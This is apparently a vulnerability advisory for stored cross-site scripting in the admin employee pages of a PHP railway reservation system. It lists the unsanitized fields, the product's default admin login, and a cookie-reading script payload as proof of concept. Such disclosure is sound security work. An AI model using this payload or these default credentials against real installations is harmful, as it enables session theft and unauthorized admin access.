# Online Railway Reservation System
## Stored XSS on `/admin/admin-add-employee.php` and `/admin/admin-update-employee.php`

### Vendor Homepage:

```
https://codeastro.com/online-railway-reservation-system-in-php-with-source-code/
```

### Version:

```
V1.0
```

### Tested on:

```
PHP, Apache, MySQL
```

### Credentials:

```
http://localhost/ORRS-PHP/admin/emp-login.php
Email   : admin@mail.com
Password: codeastro.com
```

### Affected Page:

```
/admin/admin-add-employee.php
/admin/admin-update-employee.php
```

The parameter  `emp_fname` , `emp_lname` , `emp_nat_idno` and `emp_addr`  are being echoed directly into the HTML without proper sanitization or validation. This allows an attacker to inject arbitrary JavaScript code into the page, leading to XSS attacks.

``` PHP Code
# /admin/admin-add-employee.php

<input class="form-control" name="emp_fname" id="inputText3" type="text">
<input class="form-control" name="emp_lname" id="inputText3" type="text">
<input class="form-control" name="emp_nat_idno" id="inputText3" type="text">
<input class="form-control" name="emp_addr" id="inputText3" type="text">

# /admin/admin-update-employee.php

<input class="form-control" name="emp_fname" id="inputText3" type="text">
<input class="form-control" name="emp_lname" id="inputText3" type="text">
<input class="form-control" name="emp_nat_idno" id="inputText3" type="text">
<input class="form-control" name="emp_addr" id="inputText3" type="text">

```

### Proof of Concept:

Payload:

```
<script>alert(document.cookie)</script>

```


### Screenshot
![10](https://github.com/user-attachments/assets/1ca1c6e7-d72b-4e73-848e-d917ebac8b6e)

![9](https://github.com/user-attachments/assets/2238f566-d08d-4103-9f9e-1145c5b2f6f1)

![8](https://github.com/user-attachments/assets/a71984fe-bab5-4123-8f62-4a25c643b406)

![7](https://github.com/user-attachments/assets/4af1c859-2f17-4684-8b3b-2bbee3e410b0)

![6](https://github.com/user-attachments/assets/95e23e34-8c71-4df4-8a6a-acf9231a4661)

![5](https://github.com/user-attachments/assets/7c001301-2e3f-4647-85cf-44d1e086a6b4)

![4](https://github.com/user-attachments/assets/790a5986-7d45-4807-9e79-e79654e0e6e2)

![3](https://github.com/user-attachments/assets/f32554fb-f945-45ff-9baf-da961578a8e2)

![2](https://github.com/user-attachments/assets/08226d55-5315-4a3a-b757-4c3161088145)

![1](https://github.com/user-attachments/assets/c4a9153b-3591-4c85-999f-e65eee77457f)




